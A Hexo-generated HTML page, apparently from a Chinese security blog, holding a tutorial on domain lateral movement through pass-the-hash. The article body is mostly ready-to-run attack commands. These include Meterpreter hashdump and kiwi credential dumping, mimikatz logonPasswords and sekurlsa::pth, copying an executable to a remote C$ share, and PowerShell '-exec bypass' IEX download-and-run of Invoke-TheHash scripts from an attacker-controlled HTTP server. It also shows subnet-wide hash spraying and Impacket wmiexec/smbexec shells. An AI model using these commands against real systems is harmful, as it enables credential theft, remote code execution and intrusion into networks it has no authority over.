@@ -1,0 +1,756 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="PTH简介PASS THE Hash 也叫 Hash 传递攻击，简称 PTH。模拟用户登录不需要用户明文密码，就可以直接  用获取到的 Hash 来登录目标系统。   利用成功的前提条件是：    开启 445 端口 SMB 服务   开启 admin$ 共享  Metasploit psexec模块通过获取的Meterpreter会话执行hashdump得到用户hash值   1hashdump">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域横向移动">
+<meta property="og:url" content="https://tsy244.github.io/2024/02/10/%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="PTH简介PASS THE Hash 也叫 Hash 传递攻击，简称 PTH。模拟用户登录不需要用户明文密码，就可以直接  用获取到的 Hash 来登录目标系统。   利用成功的前提条件是：    开启 445 端口 SMB 服务   开启 admin$ 共享  Metasploit psexec模块通过获取的Meterpreter会话执行hashdump得到用户hash值   1hashdump">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210155140579.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210160238443.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210160638079.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210165548361.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210162329416.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210173949706.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240327104533204.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240327104602952.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210200220058.png">
+<meta property="article:published_time" content="2024-02-10T07:18:26.000Z">
+<meta property="article:modified_time" content="2024-03-27T10:55:36.683Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210155140579.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>域横向移动 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="域横向移动"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-10 15:18" pubdate>
+          February 10, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">域横向移动</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="PTH简介"><a href="#PTH简介" class="headerlink" title="PTH简介"></a>PTH简介</h1><p>PASS THE Hash 也叫 Hash 传递攻击，简称 PTH。模拟用户登录不需要用户明文密码，就可以直接  用获取到的 Hash 来登录目标系统。  </p>
+<p>利用成功的前提条件是：  </p>
+<ul>
+<li>开启 445 端口 SMB 服务  </li>
+<li>开启 admin$ 共享</li>
+</ul>
+<h1 id="Metasploit-psexec模块"><a href="#Metasploit-psexec模块" class="headerlink" title="Metasploit psexec模块"></a>Metasploit psexec模块</h1><p>通过获取的Meterpreter会话执行hashdump得到用户hash值  </p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hashdump</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210155140579.png" srcset="/img/loading.gif" lazyload alt="image-20240210155140579"></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi </span><br><span class="hljs-attribute">creds_all</span><br></code></pre></td></tr></table></figure>
+
+<p>注意该模块是需要管理员权限</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210160238443.png" srcset="/img/loading.gif" lazyload alt="image-20240210160238443"></p>
+<p>使用 msf psexec模块</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210160638079.png" srcset="/img/loading.gif" lazyload alt="image-20240210160638079"></p>
+<p>就直接使用他的hash值，就不需要具体的密码了</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210165548361.png" srcset="/img/loading.gif" lazyload alt="image-20240210165548361"></p>
+<p>这个hash 的格式是</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">LM <span class="hljs-built_in">hash</span>:NTML <span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure>
+
+<p>但是LM hash 其实已经被启用了，所以只只需要后面的NTML hash 就可以了，但是由于msf 需要检验格式，所以必须保证前面的字符必须是规定的长度</p>
+<p>利用成功</p>
+<p>这个就是hash传递 也称为 PTH</p>
+<p>如果是使用域用户登录的话，那么就要指定smbdomain，然后使用域用户的hash</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210162329416.png" srcset="/img/loading.gif" lazyload alt="image-20240210162329416"></p>
+<p>注意</p>
+<p>如果是攻击内网的主机记得添加代理</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">setg proxies</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="cs-hash传递攻击"><a href="#cs-hash传递攻击" class="headerlink" title="cs hash传递攻击"></a>cs hash传递攻击</h1><ol>
+<li>创建一个监听器</li>
+</ol>
+<p>   选择 bind 或者是 smb </p>
+<p>   因为是在内网，使用bind 符合网络环境</p>
+<ol start="2">
+<li><p>使用psexec进行迁移</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210173949706.png" srcset="/img/loading.gif" lazyload alt="image-20240210173949706"></p>
+</li>
+</ol>
+<p>还可以使用 minikatz 的方式进行hash传递</p>
+<h1 id="Mimikatz-Hash传递攻击"><a href="#Mimikatz-Hash传递攻击" class="headerlink" title="Mimikatz Hash传递攻击"></a>Mimikatz Hash传递攻击</h1><p>  当我们获得了内网中一台主机的NTLM哈希值，我们可以利用mimikatz对这个主机进行哈希传递攻  击，执行命令成功后将会反弹回cmd  </p>
+<p>如果迷人有获取到hash请执行下面的方法</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure>
+
+<p>如果存在错误请使用::查看对应模块，对应功能</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240327104533204.png" srcset="/img/loading.gif" lazyload alt="image-20240327104533204"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240327104602952.png" srcset="/img/loading.gif" lazyload alt="image-20240327104602952"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:august /domain:10.10.10.20 /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210200220058.png" srcset="/img/loading.gif" lazyload alt="image-20240210200220058"></p>
+<p>在弹出的cmd中由于含有key（对应域环境的凭证），我们还可以直接连接该主机，还可以查看目录文件等操作  </p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net use \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.20</span>\c<span class="hljs-variable">$</span><br><span class="hljs-built_in">dir</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.20</span>\c<span class="hljs-variable">$</span><br><span class="hljs-built_in">copy</span> <span class="hljs-number">1</span>.exe \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.20</span>\c<span class="hljs-variable">$</span><br>net use <span class="hljs-built_in">h</span>: \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.20</span>\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>
+
+<p>除了上面的操作</p>
+<p>还可以创建定时任务（有可能会报错，因为现在是system 用户，不支持），等等</p>
+<h1 id="Powershell-Hash传递攻击"><a href="#Powershell-Hash传递攻击" class="headerlink" title="Powershell Hash传递攻击"></a>Powershell Hash传递攻击</h1><p>  需要同时加载Invoke-WMIExec.ps1、Invoke-TheHash.ps1 </p>
+<blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a>  </p>
+</blockquote>
+<p>记载脚本</p>
+<p>但是使用这个方式，需要设置(-ep&#x2F;-exec   bypass)</p>
+<p>或者是远程加载就不需要设置</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-exec</span> bypass<br><br><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-WMIExec</span>.ps1<br><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-TheHash</span>.ps1<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-exec</span> bypass<br><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.3.86:8000/Invoke-WMIExec.ps1&#x27;</span>);<br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.3.86:8000/Invoke-TheHash.ps1&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-TheHash</span> <span class="hljs-literal">-Type</span> WMIExec <span class="hljs-literal">-Target</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-Username</span> administrator <span class="hljs-literal">-Hash</span> <span class="hljs-number">579110</span>c49145015c47ecd267657d3174<br></code></pre></td></tr></table></figure>
+
+<p>批量撞指定的内网机器</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">工作组：<br><span class="hljs-built_in">PS</span> C:\Users\Administrator&gt; <span class="hljs-built_in">Invoke-TheHash</span> <span class="hljs-literal">-Type</span> WMIExec <span class="hljs-literal">-Target</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-Username</span> administrator <span class="hljs-literal">-Hash</span> b4e535a9bb56bcc084602062c9e2a9d4<br><br>域：<br><span class="hljs-built_in">PS</span> C:\Users\Administrator&gt; <span class="hljs-built_in">Invoke-TheHash</span> <span class="hljs-literal">-Type</span> WMIExec <span class="hljs-literal">-Target</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-Domain</span> mingy <span class="hljs-literal">-Username</span> administrator <span class="hljs-literal">-Hash</span> e1c61709dffcf154ac9d77b5024f6d10<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="利用Impacket-wmiexec-exe传递攻击"><a href="#利用Impacket-wmiexec-exe传递攻击" class="headerlink" title="利用Impacket - wmiexec.exe传递攻击"></a>利用Impacket - wmiexec.exe传递攻击</h1><p>该脚本是通过445端口进行通信的，不是135</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 域用户</span><br><span class="hljs-attribute">wmiexec</span>.exe -hashes :<span class="hljs-number">518</span>B98AD4178A53695DC997AA02D455C 域名/administrator@<span class="hljs-number">192.168.3.123</span> <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">命令执行：<br>wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">45</span>a524862326cb9e7d85af40<span class="hljs-number">17a000f0</span> administrator@<span class="hljs-number">10.10.10.20</span> &quot;whoami&quot;<br><br>得到shell：<br>smbexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">45</span>a524862326cb9e7d85af40<span class="hljs-number">17a000f0</span> administrator@<span class="hljs-number">10.10.10.20</span><br></code></pre></td></tr></table></figure>
+
+<p>Linux </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 工作组</span><br><span class="hljs-attribute">python</span> wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">45</span>a524862326cb9e7d85af4017a000f0 administrator@<span class="hljs-number">10.10.10.20</span> <span class="hljs-string">&quot;ipconfig&quot;</span><br><br><span class="hljs-comment"># 域用户</span><br><span class="hljs-attribute">python</span> wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">45</span>a524862326cb9e7d85af4017a000f0 域名/administrator@<span class="hljs-number">10.10.10.20</span> <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>域横向移动</div>
+      <div>https://tsy244.github.io/2024/02/10/渗透/域横向移动/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 10, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/10/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/09/%E6%95%B4%E7%90%86/jboss%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="jboss漏洞整理">
+                        <span class="hidden-mobile">jboss漏洞整理</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
